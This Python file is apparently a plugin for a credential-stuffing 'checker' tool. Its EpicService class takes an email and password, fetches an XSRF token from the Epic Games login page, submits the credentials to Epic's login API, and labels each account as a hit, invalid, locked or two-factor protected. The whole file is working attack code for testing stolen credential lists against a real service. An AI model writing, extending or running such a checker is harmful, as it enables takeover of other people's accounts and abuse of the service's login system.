# language: Python 3.11 — services/epic.py
import aiohttp

from .base import BaseService, CheckResult, Status
from config import USER_AGENT

INVALID_CREDS = "errors.com.epicgames.account.invalid_account_credentials"


class EpicService(BaseService):
    name = "epic"

    async def check(self, session: aiohttp.ClientSession, email: str, pw: str) -> CheckResult:
        try:
            async with session.get(
                "https://www.epicgames.com/id/login",
                headers={"User-Agent": USER_AGENT},
            ) as r:
                cookies = r.cookies

            xsrf = cookies.get("XSRF-TOKEN")
            if not xsrf:
                return CheckResult(self.name, email, Status.ERROR, "no xsrf token")

            async with session.post(
                "https://www.epicgames.com/id/api/login",
                json={"email": email, "password": pw, "rememberMe": True},
                headers={
                    "User-Agent": USER_AGENT,
                    "X-XSRF-TOKEN": xsrf,
                    "Content-Type": "application/json",
                },
            ) as r:
                status_code = r.status
                try:
                    j = await r.json(content_type=None)
                except Exception:
                    j = {}
                set_cookie = r.headers.getall("Set-Cookie", [])

            if status_code == 401:
                return CheckResult(self.name, email, Status.INVALID, "unauthorized")
            if status_code == 403:
                return CheckResult(self.name, email, Status.LOCKED, "blocked")
            if status_code == 200:
                if isinstance(j, dict) and j.get("errorCode") == INVALID_CREDS:
                    return CheckResult(self.name, email, Status.INVALID, "bad credentials")
                if any("EPIC_2FA" in c or "twoFactor" in str(j) for c in set_cookie):
                    return CheckResult(self.name, email, Status.TWOFA, "epic mfa")
                if any(c.startswith("EPIC_SESSION") or "EPIC_BEARER" in c for c in set_cookie):
                    return CheckResult(self.name, email, Status.HIT, "session ok")
                return CheckResult(self.name, email, Status.HIT, "login ok")
            return CheckResult(self.name, email, Status.ERROR, f"http {status_code}")
        except Exception as e:
            return CheckResult(self.name, email, Status.ERROR, str(e)[:120])
